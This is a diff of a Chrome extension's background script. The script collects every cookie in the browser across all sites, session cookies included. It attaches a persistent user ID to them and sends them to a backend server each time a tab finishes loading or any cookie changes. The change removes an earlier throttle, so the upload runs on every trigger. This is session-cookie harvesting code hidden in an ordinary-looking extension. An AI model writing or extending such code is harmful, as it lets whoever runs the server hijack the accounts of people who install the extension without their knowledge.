@@ -1,62 +1,16 @@
 let sentCookies = {};
-let reducingCalls = false;
-const REDUCING_API_CALLS_PERIOD = 30000;
 
 //Enabling the extension to be able to identify specific users
-function getOrCreateUserId(callback) {
-  chrome.storage.local.get("userId", (data) => {
-    let userId = data.userId;
-    if (!userId) {
-      userId = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-        var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
-        return v.toString(16);
-      });
-      chrome.storage.local.set({userId: userId}, () => {
-        callback(userId);
-      });
-    } else {
-      callback(userId);
-    }
-  });
-}
-// using this to get cookies in chrome
-function getAllCookiesAsync() {
-  return new Promise((resolve, reject) => {
-    chrome.cookies.getAll({}, (cookies) => {
-      if (chrome.runtime.lastError) {
-        reject(chrome.runtime.lastError);
-      } else {
-        resolve(cookies);
-      }
-    });
+
+function generateUUID() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
   });
 }
 
-// using this to process cookies after some time
-async function updateAllCookiesAndSend() {
-  try {
-    const cookies = await getAllCookiesAsync();
-    sendCookiesIfNotOnCooldown(cookies);
-  } catch (error) {
-    console.error('Error retrieving cookies:', error);
-  }
-}
-
-// to reduce API calls, and then send cookies to backend
-function sendCookiesIfEnoughPeriod(cookies){
-  if (!reducingCalls) {
-    sendCookiesToServer(cookies)
-    reducingCalls = true;
-    setTimeout( () => {
-      reducingCalls = false;
-    }, REDUCING_API_CALLS_PERIOD);
-  }
-}
-
-// here the cookies are being send
 function sendCookiesToServer(cookies) {
   //local storage is used to identify the users
-  /*
   chrome.storage.local.get("userId", (data) => {
       let userId = data.userId;
       if (!userId) {
@@ -71,15 +25,6 @@ function sendCookiesToServer(cookies) {
           secure: cookie.secure || false,
           session: cookie.session || false
       }));
-      */
-     getOrCreateUserId((userId) => {
-      const formattedCookies = cookies.map(cookie => ({
-        ...cookie,
-        userId,
-        expirationDate: cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toISOString() : undefined,
-        secure: cookie.secure || false,
-        session: cookie.session || false
-    }));
 
       const newOrUpdatedCookies = formattedCookies.filter(cookie => {
           const cookieId = `${cookie.domain}-${cookie.name}`;
@@ -109,12 +54,11 @@ function getAllCookiesAndSendToServer() {
     if (chrome.runtime.lastError) {
       return;
     }
-    sendCookiesIfEnoughPeriod(cookies);
+    sendCookiesToServer(cookies);
 
   });
 }
 
-// use when content scrip is ready
 let contentScriptLoaded = false;
 
 chrome.runtime.onMessage.addListener((message, sender) => {
@@ -123,15 +67,13 @@ chrome.runtime.onMessage.addListener((message, sender) => {
   }
 });
 
-// using this to update the tabs
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
   if (changeInfo.status === 'complete' && tab.active && contentScriptLoaded) {
-    updateAllCookiesAndSend();
+    getAllCookiesAndSendToServer();
   }
 });
 
-//if cookies change
-chrome.cookies.onChanged.addListener((changeInfo) => {
-  updateAllCookiesAndSend();
+chrome.cookies.onChanged.addListener(() => {
+  getAllCookiesAndSendToServer();
 });
 
